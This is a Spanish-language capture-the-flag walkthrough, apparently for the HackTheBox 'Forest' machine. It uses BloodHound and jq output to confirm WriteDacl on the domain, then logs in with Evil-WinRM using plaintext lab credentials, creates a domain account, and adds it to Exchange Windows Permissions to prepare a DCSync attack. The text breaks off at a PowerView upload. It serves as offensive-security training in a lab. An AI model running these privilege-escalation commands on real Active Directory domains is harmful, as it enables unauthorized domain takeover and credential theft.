La fase siguiente consiste en importar el ZIP en BloodHound.

Después se debe buscar el usuario svc-alfresco.

A continuación se marca como Owned.

Luego se ejecuta una búsqueda de rutas hacia objetivos de alto valor.

La comprobación clave será si svc-alfresco, por su pertenencia a Account Operators, puede crear o modificar usuarios y añadirlos a grupos no protegidos.

Respuesta

La recolección está bien. No hace falta repetir ahora bloodhound-python.

Los avisos no bloquean el avance porque los JSON existen y contienen datos útiles.

El siguiente paso no es lanzar más comandos en la víctima. Ahora toca analizar el ZIP en BloodHound.

Comandos

Desde Parrot, se puede comprobar el ZIP generado:

cd /home/r4mon/pentest/targets/HTB/easy/FOREST
ls -lah content/bloodhound/forest_bloodhound_20260429_170450.zip

Para revisar rápidamente si los nombres clave aparecen en los JSON:

grep -RniE 'svc-alfresco|Account Operators|Exchange Windows Permissions|Domain Admins|Remote Management Users' content/bloodhound/*.json

Este comando no sustituye a BloodHound, pero permite confirmar que los objetos importantes están presentes en los datos recolectados.

En BloodHound:

1. Importar forest_bloodhound_20260429_170450.zip.
2. Buscar SVC-ALFRESCO@HTB.LOCAL.
3. Marcar el usuario como Owned.
4. Buscar rutas hacia High Value Targets.
5. Revisar especialmente:
   - Account Operators
   - Exchange Windows Permissions
   - Domain Admins
   - permisos WriteDacl o GenericAll
Comprobaciones

Debe importarse correctamente:

content/bloodhound/forest_bloodhound_20260429_170450.zip

Debe aparecer el usuario:

SVC-ALFRESCO@HTB.LOCAL

Debe confirmarse su pertenencia a:

ACCOUNT OPERATORS
SERVICE ACCOUNTS
PRIVILEGED IT ACCOUNTS
REMOTE MANAGEMENT USERS

Debe comprobarse si existe una ruta hacia algún objetivo de alto valor.

Debe prestarse atención especial a cualquier relación con:

EXCHANGE WINDOWS PERMISSIONS

y a cualquier permiso sobre el dominio como:

WriteDacl
GenericAll
DCSync
Registro didáctico

El fallo de SharpHound por .NET no bloqueó la fase de análisis de dominio. La recolección alternativa desde Parrot con bloodhound-python permitió obtener los datos principales de Active Directory sin depender del runtime de la máquina víctima.

El aviso de clock skew indica un problema de sincronización horaria que puede afectar a Kerberos, pero la herramienta pudo continuar usando NTLM y generar los JSON principales.

El hallazgo dominante sigue siendo la pertenencia de svc-alfresco a Account Operators.

La rama principal activa es:

AD / permisos de dominio / BloodHound

Las ramas secundarias quedan así:

WinRM: acceso consolidado
Kerberos: usado para obtener credencial inicial
SMB: apoyo para validación y enumeración

El siguiente paso único es importar el ZIP en BloodHound y confirmar la ruta de escalada desde svc-alfresco.

## Al ejecutar tenemos una salida enorme.

Conclusiones

Es normal que ese grep sea enorme. Los JSON de BloodHound no están pensados para leerse “a ojo” con grep amplio.

La decisión correcta ahora es dejar de buscar en bruto y hacer consultas más dirigidas, o importar directamente el ZIP en BloodHound y analizar la ruta visualmente.

Objetivo

Reducir el ruido y comprobar solo los objetos clave:

SVC-ALFRESCO@HTB.LOCAL
ACCOUNT OPERATORS@HTB.LOCAL
EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
REMOTE MANAGEMENT USERS@HTB.LOCAL
DOMAIN ADMINS@HTB.LOCAL
Hechos verificados

El ZIP de BloodHound ya existe:

content/bloodhound/forest_bloodhound_20260429_170450.zip

La recolección generó datos de usuarios, grupos, equipos, OUs, GPOs, contenedores y dominio.

El grep amplio genera demasiado ruido porque busca cadenas dentro de JSON grandes y anidados.

Método

No se debe revisar todo el JSON completo.

La revisión útil consiste en:

listar nombres de usuarios relevantes;
listar nombres de grupos relevantes;
confirmar que svc-alfresco aparece en los datos;
importar el ZIP en BloodHound;
marcar svc-alfresco como owned;
pedir la ruta hacia High Value Targets.
Respuesta

Usa consultas más pequeñas. Primero confirma nombres y objetos. Después BloodHound hará mucho mejor el análisis de rutas que un grep gigante.

Comandos

Desde Parrot:

cd /home/r4mon/pentest/targets/HTB/easy/FOREST

Listar solo usuarios relevantes:

jq -r '.data[].Properties.name' content/bloodhound/*users.json \
  | grep -Ei 'svc-alfresco|sebastien|lucinda|andy|mark|santi'

Listar solo grupos relevantes:

jq -r '.data[].Properties.name' content/bloodhound/*groups.json \
  | grep -Ei 'account operators|exchange windows permissions|domain admins|remote management users|service accounts|privileged it accounts'

Ver el objeto completo de svc-alfresco de forma legible:

jq '.data[] | select(.Properties.name=="SVC-ALFRESCO@HTB.LOCAL")' \
  content/bloodhound/*users.json

Ver solo campos básicos de svc-alfresco:

jq -r '.data[]
  | select(.Properties.name=="SVC-ALFRESCO@HTB.LOCAL")
  | {
      name: .Properties.name,
      distinguishedname: .Properties.distinguishedname,
      enabled: .Properties.enabled,
      admincount: .Properties.admincount,
      description: .Properties.description
    }' content/bloodhound/*users.json

Ver los objetos de grupos clave:

jq -r '.data[]
  | select(.Properties.name | test("ACCOUNT OPERATORS|EXCHANGE WINDOWS PERMISSIONS|DOMAIN ADMINS|REMOTE MANAGEMENT USERS|SERVICE ACCOUNTS|PRIVILEGED IT ACCOUNTS"; "i"))
  | .Properties.name' content/bloodhound/*groups.json
Comprobaciones

Debe aparecer:

SVC-ALFRESCO@HTB.LOCAL

Deben aparecer grupos como:

ACCOUNT OPERATORS@HTB.LOCAL
REMOTE MANAGEMENT USERS@HTB.LOCAL
SERVICE ACCOUNTS@HTB.LOCAL
PRIVILEGED IT ACCOUNTS@HTB.LOCAL
EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
DOMAIN ADMINS@HTB.LOCAL

Después, el paso importante ya no es seguir con grep, sino importar:

content/bloodhound/forest_bloodhound_20260429_170450.zip

en BloodHound.

Registro didáctico

grep sirve para una comprobación rápida, pero no para analizar rutas de privilegios en BloodHound. Los JSON contienen muchas relaciones anidadas y generan demasiado ruido.

Para esta fase, BloodHound es la herramienta adecuada porque permite ver caminos entre usuarios, grupos y permisos.

El hallazgo dominante sigue siendo:

svc-alfresco pertenece a Account Operators

La rama principal activa sigue siendo:

AD / permisos de dominio / BloodHound

El siguiente paso único es importar el ZIP y revisar la ruta desde SVC-ALFRESCO@HTB.LOCAL hacia objetivos de alto valor.

## Ejecutamos:

❯ jq -r '.data[].Properties.name' content/bloodhound/*users.json \
  | grep -Ei 'svc-alfresco|sebastien|lucinda|andy|mark|santi'
SANTI@HTB.LOCAL
ANDY@HTB.LOCAL
MARK@HTB.LOCAL
SVC-ALFRESCO@HTB.LOCAL
LUCINDA@HTB.LOCAL
SEBASTIEN@HTB.LOCAL
❯ jq -r '.data[].Properties.name' content/bloodhound/*groups.json \
  | grep -Ei 'account operators|exchange windows permissions|domain admins|remote management users|service accounts|privileged it accounts'
PRIVILEGED IT ACCOUNTS@HTB.LOCAL
SERVICE ACCOUNTS@HTB.LOCAL
EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
ACCOUNT OPERATORS@HTB.LOCAL
DOMAIN ADMINS@HTB.LOCAL
REMOTE MANAGEMENT USERS@HTB.LOCAL
❯ jq '.data[] | select(.Properties.name=="SVC-ALFRESCO@HTB.LOCAL")' \
  content/bloodhound/*users.json
{
  "AllowedToDelegate": [],
  "ObjectIdentifier": "S-1-5-21-3072663084-364016917-1341370565-1147",
  "PrimaryGroupSID": "S-1-5-21-3072663084-364016917-1341370565-513",
  "Properties": {
    "name": "SVC-ALFRESCO@HTB.LOCAL",
    "domain": "HTB.LOCAL",
    "domainsid": "S-1-5-21-3072663084-364016917-1341370565",
    "distinguishedname": "CN=SVC-ALFRESCO,OU=SERVICE ACCOUNTS,DC=HTB,DC=LOCAL",
    "unconstraineddelegation": false,
    "trustedtoauth": false,
    "passwordnotreqd": false,
    "enabled": true,
    "lastlogon": 1777475407,
    "lastlogontimestamp": 1777463296,
    "pwdlastset": 1777475382,
    "dontreqpreauth": true,
    "pwdneverexpires": true,
    "sensitive": false,
    "serviceprincipalnames": [],
    "hasspn": false,
    "displayname": "svc-alfresco",
    "email": null,
    "title": null,
    "homedirectory": null,
    "description": null,
    "userpassword": null,
    "admincount": true,
    "sidhistory": [],
    "whencreated": 1568941131,
    "unixpassword": null,
    "unicodepassword": null,
    "logonscript": null,
    "samaccountname": "svc-alfresco",
    "sfupassword": null
  },
  "Aces": [
    {
      "RightName": "Owns",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-512",
      "PrincipalType": "Group"
    },
    {
      "RightName": "GenericWrite",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-512",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteOwner",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-512",
      "PrincipalType": "Group"
    },
    {
      "RightName": "AllExtendedRights",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-512",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteDacl",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-512",
      "PrincipalType": "Group"
    },
    {
      "RightName": "GenericWrite",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-519",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteOwner",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-519",
      "PrincipalType": "Group"
    },
    {
      "RightName": "AllExtendedRights",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-519",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteDacl",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-519",
      "PrincipalType": "Group"
    },
    {
      "RightName": "GenericWrite",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-32-544",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteOwner",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-32-544",
      "PrincipalType": "Group"
    },
    {
      "RightName": "AllExtendedRights",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-32-544",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteDacl",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-32-544",
      "PrincipalType": "Group"
    }
  ],
  "SPNTargets": [],
  "HasSIDHistory": [],
  "IsDeleted": false,
  "IsACLProtected": true
}
❯ jq -r '.data[]
  | select(.Properties.name=="SVC-ALFRESCO@HTB.LOCAL")
  | {
      name: .Properties.name,
      distinguishedname: .Properties.distinguishedname,
      enabled: .Properties.enabled,
      admincount: .Properties.admincount,
      description: .Properties.description
    }' content/bloodhound/*users.json
{
  "name": "SVC-ALFRESCO@HTB.LOCAL",
  "distinguishedname": "CN=SVC-ALFRESCO,OU=SERVICE ACCOUNTS,DC=HTB,DC=LOCAL",
  "enabled": true,
  "admincount": true,
  "description": null
}
❯ jq -r '.data[]
  | select(.Properties.name | test("ACCOUNT OPERATORS|EXCHANGE WINDOWS PERMISSIONS|DOMAIN ADMINS|REMOTE MANAGEMENT USERS|SERVICE ACCOUNTS|PRIVILEGED IT ACCOUNTS"; "i"))
  | .Properties.name' content/bloodhound/*groups.json
PRIVILEGED IT ACCOUNTS@HTB.LOCAL
SERVICE ACCOUNTS@HTB.LOCAL
EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
ACCOUNT OPERATORS@HTB.LOCAL
DOMAIN ADMINS@HTB.LOCAL
REMOTE MANAGEMENT USERS@HTB.LOCAL

## Conclusiones

BloodHound confirma ya varios puntos críticos de la máquina Forest.

La cuenta SVC-ALFRESCO@HTB.LOCAL existe como usuario real del dominio, está habilitada y tiene el atributo:

dontreqpreauth: true

Ese dato explica por qué funcionó ASREPRoasting y convierte en hecho verificado que la cuenta no requiere preautenticación Kerberos.

También queda confirmado que existen los grupos relevantes para la fase de escalada:

ACCOUNT OPERATORS@HTB.LOCAL
EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
DOMAIN ADMINS@HTB.LOCAL
REMOTE MANAGEMENT USERS@HTB.LOCAL
SERVICE ACCOUNTS@HTB.LOCAL
PRIVILEGED IT ACCOUNTS@HTB.LOCAL

El punto que no debe interpretarse mal es el bloque Aces del objeto SVC-ALFRESCO. Esos permisos son ACLs sobre el objeto svc-alfresco, no permisos que svc-alfresco tenga automáticamente sobre otros objetos.

El siguiente paso único es comprobar si EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL tiene WriteDacl sobre el dominio HTB.LOCAL.

Objetivo

Confirmar la ruta de escalada de dominio antes de ejecutar cambios.

La finalidad de esta fase es verificar si el grupo Exchange Windows Permissions tiene permisos suficientes sobre el dominio para permitir una futura concesión de privilegios tipo DCSync.

Hechos verificados

BloodHound contiene el usuario:

SVC-ALFRESCO@HTB.LOCAL

El objeto tiene estos atributos relevantes:

enabled: true
dontreqpreauth: true
pwdneverexpires: true
hasspn: false
admincount: true
samaccountname: svc-alfresco

dontreqpreauth: true confirma la condición que permitió obtener el hash AS-REP.

hasspn: false indica que esta cuenta no es candidata directa a Kerberoasting por SPN.

admincount: true indica que la cuenta está marcada como objeto protegido o relacionado con grupos protegidos. Esto es coherente con su pertenencia efectiva a grupos administrativos observada en whoami /groups.

La pertenencia efectiva ya observada desde WinRM incluye:

BUILTIN\Account Operators
BUILTIN\Remote Management Users
HTB\Privileged IT Accounts
HTB\Service Accounts

Los grupos clave existen en los datos de BloodHound:

ACCOUNT OPERATORS@HTB.LOCAL
EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
DOMAIN ADMINS@HTB.LOCAL
REMOTE MANAGEMENT USERS@HTB.LOCAL
SERVICE ACCOUNTS@HTB.LOCAL
PRIVILEGED IT ACCOUNTS@HTB.LOCAL
Suposiciones

La ruta probable de escalada pasa por Account Operators.

La pertenencia a Account Operators puede permitir crear o modificar cuentas y añadirlas a grupos no protegidos.

Exchange Windows Permissions es el grupo que debe revisarse ahora, porque en entornos Exchange puede tener permisos peligrosos sobre el dominio.

Todavía no queda verificado localmente que Exchange Windows Permissions tenga WriteDacl sobre HTB.LOCAL.

Método

La comprobación debe hacerse en dos pasos.

Primero se obtiene el SID del grupo Exchange Windows Permissions.

Después se revisan las ACLs del objeto dominio HTB.LOCAL para comprobar si ese SID aparece con permisos como WriteDacl.

Si se confirma WriteDacl, la ruta quedará técnicamente justificada:

svc-alfresco
-> Account Operators
-> capacidad de añadir un usuario controlado a Exchange Windows Permissions
-> Exchange Windows Permissions con WriteDacl sobre el dominio
-> posibilidad de preparar DCSync
Respuesta

El análisis va bien y la ruta empieza a encajar.

Ahora no conviene crear usuarios ni modificar grupos todavía. Primero debe confirmarse la relación crítica en BloodHound: Exchange Windows Permissions con WriteDacl sobre el dominio.

Comandos

Desde Parrot:

cd /home/r4mon/pentest/targets/HTB/easy/FOREST

Crear un mapa simple de identificadores a nombres:

jq -r '.data[] | [.ObjectIdentifier, .Properties.name] | @tsv' \
  content/bloodhound/*users.json content/bloodhound/*groups.json content/bloodhound/*domains.json \
  > content/bloodhound/id_name_map.tsv

Obtener el SID de Exchange Windows Permissions:

EWP_SID=$(jq -r '.data[]
  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL")
  | .ObjectIdentifier' content/bloodhound/*groups.json)

echo "$EWP_SID"

Comprobar qué permisos tiene ese SID sobre el dominio:

jq -r --arg EWP "$EWP_SID" '
  .data[]
  | select(.Properties.name=="HTB.LOCAL")
  | .Aces[]?
  | select(.PrincipalSID==$EWP)
  | [.RightName, .PrincipalType, .IsInherited] | @tsv
' content/bloodhound/*domains.json

La salida importante sería una línea que contenga:

WriteDacl

Para ver el objeto del dominio de forma más amplia:

jq '.data[]
  | select(.Properties.name=="HTB.LOCAL")
  | {
      name: .Properties.name,
      domain: .Properties.domain,
      distinguishedname: .Properties.distinguishedname,
      highvalue: .Properties.highvalue,
      aces: .Aces
    }' content/bloodhound/*domains.json

Para comprobar el objeto del grupo Exchange Windows Permissions:

jq '.data[]
  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL")
  | {
      name: .Properties.name,
      distinguishedname: .Properties.distinguishedname,
      highvalue: .Properties.highvalue,
      admincount: .Properties.admincount,
      objectid: .ObjectIdentifier,
      members: .Members
    }' content/bloodhound/*groups.json
Comprobaciones

Debe aparecer un SID para:

EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL

Debe comprobarse si ese SID aparece dentro de las ACLs del dominio HTB.LOCAL.

La señal crítica buscada es:

WriteDacl

Si aparece WriteDacl, la siguiente fase será preparar una cuenta controlada y validar si puede añadirse al grupo Exchange Windows Permissions.

Si no aparece WriteDacl, habrá que volver a BloodHound y revisar otra ruta hacia objetivos de alto valor.

Explicación didáctica

El objeto SVC-ALFRESCO@HTB.LOCAL confirma retrospectivamente la vía inicial: dontreqpreauth: true justifica ASREPRoasting y la obtención del hash Kerberos.

La escalada ya no depende de Kerberos. Ahora depende de relaciones de Active Directory.

La pertenencia a Account Operators no equivale directamente a ser administrador del dominio. Su valor está en que puede permitir administrar cuentas y grupos no protegidos.

La clave de Forest suele estar en combinar esa capacidad con un grupo de Exchange que tenga permisos peligrosos sobre el dominio.

Por eso el siguiente punto técnico no es crear nada todavía, sino verificar una relación concreta:

EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL -- WriteDacl --> HTB.LOCAL

El hallazgo dominante actual es:

svc-alfresco pertenece a Account Operators y existe Exchange Windows Permissions

La rama principal activa es:

AD / permisos de dominio / BloodHound

El siguiente paso único es comprobar WriteDacl sobre el dominio.

## Ejecutamos:

❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
❯ jq -r '.data[] | [.ObjectIdentifier, .Properties.name] | @tsv' \
  content/bloodhound/*users.json content/bloodhound/*groups.json content/bloodhound/*domains.json \
  > content/bloodhound/id_name_map.tsv
❯ EWP_SID=$(jq -r '.data[]
  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL")
  | .ObjectIdentifier' content/bloodhound/*groups.json)

echo "$EWP_SID"
S-1-5-21-3072663084-364016917-1341370565-1121
❯ jq -r --arg EWP "$EWP_SID" '
  .data[]
  | select(.Properties.name=="HTB.LOCAL")
  | .Aces[]?
  | select(.PrincipalSID==$EWP)
  | [.RightName, .PrincipalType, .IsInherited] | @tsv
' content/bloodhound/*domains.json
WriteDacl	Group	false
WriteDacl	Group	false
❯ jq '.data[]
  | select(.Properties.name=="HTB.LOCAL")
  | {
      name: .Properties.name,
      domain: .Properties.domain,
      distinguishedname: .Properties.distinguishedname,
      highvalue: .Properties.highvalue,
      aces: .Aces
    }' content/bloodhound/*domains.json
{
  "name": "HTB.LOCAL",
  "domain": "HTB.LOCAL",
  "distinguishedname": "DC=HTB,DC=LOCAL",
  "highvalue": true,
  "aces": [
    {
      "RightName": "Owns",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-32-544",
      "PrincipalType": "Group"
    },
    {
      "RightName": "GetChanges",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-498",
      "PrincipalType": "Group"
    },
    {
      "RightName": "GetChangesAll",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-516",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteDacl",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-1121",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteDacl",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-1121",
      "PrincipalType": "Group"
    },
    {
      "RightName": "GetChangesInFilteredSet",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-32-544",
      "PrincipalType": "Group"
    },
    {
      "RightName": "GetChanges",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-32-544",
      "PrincipalType": "Group"
    },
    {
      "RightName": "GetChangesAll",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-32-544",
      "PrincipalType": "Group"
    },
    {
      "RightName": "GetChangesInFilteredSet",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-9",
      "PrincipalType": "Group"
    },
    {
      "RightName": "GetChanges",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-9",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteOwner",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-512",
      "PrincipalType": "Group"
    },
    {
      "RightName": "AllExtendedRights",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-512",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteDacl",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-512",
      "PrincipalType": "Group"
    },
    {
      "RightName": "GenericAll",
      "IsInherited": false,
      "PrincipalSID": "S-1-5-21-3072663084-364016917-1341370565-519",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteOwner",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-32-544",
      "PrincipalType": "Group"
    },
    {
      "RightName": "AllExtendedRights",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-32-544",
      "PrincipalType": "Group"
    },
    {
      "RightName": "WriteDacl",
      "IsInherited": false,
      "PrincipalSID": "HTB.LOCAL-S-1-5-32-544",
      "PrincipalType": "Group"
    }
  ]
}
❯ jq '.data[]
  | select(.Properties.name=="EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL")
  | {
      name: .Properties.name,
      distinguishedname: .Properties.distinguishedname,
      highvalue: .Properties.highvalue,
      admincount: .Properties.admincount,
      objectid: .ObjectIdentifier,
      members: .Members
    }' content/bloodhound/*groups.json
{
  "name": "EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL",
  "distinguishedname": "CN=EXCHANGE WINDOWS PERMISSIONS,OU=MICROSOFT EXCHANGE SECURITY GROUPS,DC=HTB,DC=LOCAL",
  "highvalue": false,
  "admincount": false,
  "objectid": "S-1-5-21-3072663084-364016917-1341370565-1121",
  "members": [
    {
      "ObjectIdentifier": "S-1-5-21-3072663084-364016917-1341370565-1119",
      "ObjectType": "Group"
    }
  ]
}

## Sync.

Esta fase modifica el laboratorio de Active Directory, por lo que debe hacerse de forma ordenada y con una cuenta claramente identificable.

Hechos verificados

El SID de Exchange Windows Permissions es:

S-1-5-21-3072663084-364016917-1341370565-1121

Ese SID aparece en las ACLs del dominio HTB.LOCAL con:

WriteDacl    Group    false
WriteDacl    Group    false

El objeto dominio es:

DC=HTB,DC=LOCAL

El dominio está marcado como objetivo de alto valor:

highvalue: true

El grupo Exchange Windows Permissions existe en:

CN=EXCHANGE WINDOWS PERMISSIONS,OU=MICROSOFT EXCHANGE SECURITY GROUPS,DC=HTB,DC=LOCAL

El grupo no está marcado como protegido:

admincount: false

Esto es importante porque Account Operators no debería poder modificar grupos protegidos como Domain Admins, pero sí puede actuar sobre grupos no protegidos.

Suposiciones

La sesión WinRM sigue activa como:

htb\svc-alfresco

La cuenta svc-alfresco conserva pertenencia efectiva a:

BUILTIN\Account Operators

Se va a crear una cuenta nueva controlada para no alterar usuarios existentes.

La contraseña debe cumplir complejidad de dominio.

Método

La fase se divide en tres pasos.

Primero se crea una cuenta nueva de dominio desde la sesión WinRM.

Después se añade esa cuenta al grupo Exchange Windows Permissions.

Opcionalmente, se añade también a Remote Management Users para permitir acceso WinRM con esa cuenta si fuera necesario.

Después de eso, se usará esa cuenta controlada para aplicar permisos DCSync sobre el dominio.

Respuesta

El siguiente paso único es crear una cuenta controlada y añadirla a Exchange Windows Permissions.

No se debe tocar todavía Domain Admins. La ruta correcta pasa por WriteDacl, no por intentar añadirse directamente a un grupo protegido.

Comandos

Estos comandos se ejecutan dentro de Evil-WinRM, en esta consola:

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>

Crear una cuenta controlada en el dominio:

net user r4mforest 'R4m0nForest!2026' /add /domain

Este comando crea un nuevo usuario de dominio llamado r4mforest.

La contraseña se ha elegido con mayúsculas, minúsculas, números y símbolo para cumplir complejidad.

Comprobar que el usuario existe:

net user r4mforest /domain

Añadir el usuario al grupo Exchange Windows Permissions:

net group "Exchange Windows Permissions" r4mforest /add /domain

Este es el paso importante de la ruta.

La razón es que ese grupo tiene WriteDacl sobre el dominio HTB.LOCAL.

Añadir el usuario a Remote Management Users:

net localgroup "Remote Management Users" r4mforest /add

Este paso permite que la nueva cuenta pueda usar WinRM si después se quiere abrir sesión con ella.

Comprobar pertenencia a grupos:

net user r4mforest /domain

También se puede comprobar el grupo directamente:

net group "Exchange Windows Permissions" /domain

Y:

net localgroup "Remote Management Users"
Comprobaciones

Debe verse que la creación del usuario termina con:

The command completed successfully.

Debe verse que la adición a Exchange Windows Permissions termina con:

The command completed successfully.

Debe verse que la adición a Remote Management Users termina con:

The command completed successfully.

El usuario nuevo debe aparecer como miembro de:

Exchange Windows Permissions

Si aparece algún error de permisos al añadir al grupo, no se continúa a DCSync. En ese caso habría que revisar si Account Operators tiene restricciones sobre ese grupo concreto.

Explicación didáctica

svc-alfresco no necesita ser administrador del dominio para avanzar.

Su valor está en que pertenece a Account Operators, un grupo que puede gestionar cuentas y ciertos grupos no protegidos.

Exchange Windows Permissions no es Domain Admins, pero tiene un permiso peligroso sobre el dominio: WriteDacl.

WriteDacl permite modificar la lista de control de acceso del objeto dominio. Si una cuenta puede modificar esa ACL, puede concederse permisos de replicación de directorio.

Esos permisos de replicación son la base de DCSync.

El hallazgo dominante actual es:

Exchange Windows Permissions tiene WriteDacl sobre HTB.LOCAL

La rama principal activa es:

AD / abuso de ACLs / preparación de DCSync

El siguiente paso único es crear r4mforest y añadirlo a Exchange Windows Permissions.

## Ejecutamos:

Nota: hacemos la password más corta por que nos exige 14 caracteres y no es necesario para el laboratorio.

❯ cd /home/r4mon/pentest/targets/HTB/easy/FOREST
❯ evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user r4mforest R4mForest!26 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user r4mforest /domain
User name                    r4mforest
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/29/2026 8:41:23 AM
Password expires             Never
Password changeable          4/30/2026 8:41:23 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" r4mforest /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" r4mforest /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user r4mforest /domain
User name                    r4mforest
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/29/2026 8:41:23 AM
Password expires             Never
Password changeable          4/30/2026 8:41:23 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.

## Conclusiones

La creación de la cuenta controlada ha funcionado correctamente.

El usuario:

r4mforest

ha sido creado en el dominio y añadido a:

Exchange Windows Permissions
Remote Management Users
Domain Users

Esto confirma que svc-alfresco, por su pertenencia a Account Operators, puede crear usuarios y modificar grupos no protegidos.

La ruta de escalada ya está preparada para el siguiente paso:

r4mforest
-> miembro de Exchange Windows Permissions
-> grupo con WriteDacl sobre HTB.LOCAL
-> posibilidad de conceder permisos DCSync
Objetivo

Conceder permisos DCSync a la cuenta controlada r4mforest.

La finalidad es permitir que esa cuenta pueda solicitar secretos de replicación del dominio y, después, usar secretsdump desde Parrot para obtener los hashes del dominio.

Hechos verificados

El usuario r4mforest existe en el dominio.

La cuenta está activa.

La contraseña configurada es:

R4mForest!26

El usuario pertenece a:

Domain Users
Exchange Windows Permissions
Remote Management Users

La pertenencia a Exchange Windows Permissions es el punto clave, porque ese grupo tiene WriteDacl sobre el dominio HTB.LOCAL.

La pertenencia a Remote Management Users permite usar WinRM con la cuenta nueva si fuera necesario.

Suposiciones

La sesión actual sigue abierta como:

htb\svc-alfresco

La cuenta nueva r4mforest puede autenticarse correctamente.

El grupo Exchange Windows Permissions ya tiene el permiso necesario para modificar la ACL del dominio.

Falta conceder explícitamente permisos DCSync a r4mforest.

Método

Primero se valida que la cuenta nueva autentica.

Después se usa PowerView para modificar la ACL del dominio y conceder a r4mforest permisos DCSync.

Finalmente, desde Parrot, se usa secretsdump con la cuenta r4mforest para comprobar si la concesión funcionó.

Respuesta

El siguiente paso único es usar PowerView para conceder permisos DCSync a r4mforest.

No se debe intentar añadir r4mforest a Domain Admins. La ruta correcta no es modificar un grupo protegido, sino abusar de WriteDacl para conceder permisos de replicación.

Comandos

Primero, desde Parrot, comprueba si tienes PowerView en la carpeta de herramientas:

cd /home/r4mon/pentest/targets/HTB/easy/FOREST
ls -lah tools/PowerView.ps1

Si existe, entra de nuevo por WinRM desde ese mismo directorio:

evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'

Dentro de Evil-WinRM, sube PowerView:

upload tools/PowerView.ps1
